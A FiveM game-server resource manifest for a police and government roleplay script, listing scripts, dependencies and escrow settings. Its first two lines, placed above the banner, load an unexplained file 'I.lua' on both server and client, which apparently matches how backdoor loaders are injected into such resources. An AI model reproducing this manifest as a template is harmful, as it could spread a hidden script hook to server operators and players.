server_script "I.lua"
client_script "I.lua"
-- █████╗ ██████╗ ███████╗██╗  ██╗    ███████╗████████╗██╗   ██╗██████╗ ██╗ ██████╗ ███████╗
--██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝    ██╔════╝╚══██╔══╝██║   ██║██╔══██╗██║██╔═══██╗██╔════╝
--███████║██████╔╝█████╗   ╚███╔╝     ███████╗   ██║   ██║   ██║██║  ██║██║██║   ██║███████╗
--██╔══██║██╔═══╝ ██╔══╝   ██╔██╗     ╚════██║   ██║   ██║   ██║██║  ██║██║██║   ██║╚════██║
--██║  ██║██║     ███████╗██╔╝ ██╗    ███████║   ██║   ╚██████╔╝██████╔╝██║╚██████╔╝███████║
--╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚══════╝
                                                                                          
fx_version 'cerulean'
game 'gta5'

author 'Apex Studios - fivem.apx-studios.com'
description 'Law Enforcement | Government Script'
version '1.2.6'
lua54 'yes'

shared_scripts { '@apex_lib/shared/locale.lua', '@ox_lib/init.lua', 'locales/en.lua', 'config/*.lua' }

client_scripts { 'source/client/*.lua', 'open-source/client.lua', '@PolyZone/client.lua', '@PolyZone/BoxZone.lua', '@PolyZone/EntityZone.lua', '@PolyZone/CircleZone.lua', '@PolyZone/ComboZone.lua' }

server_scripts { '@oxmysql/lib/MySQL.lua', 'source/server/*.lua', 'open-source/server.lua' }

escrow_ignore { 'open-source/*.lua', 'locales/*.lua', 'config/*.lua' }

dependency 'apex_lib'

export { 'isHandcuffed' }
dependency '/assetpacks'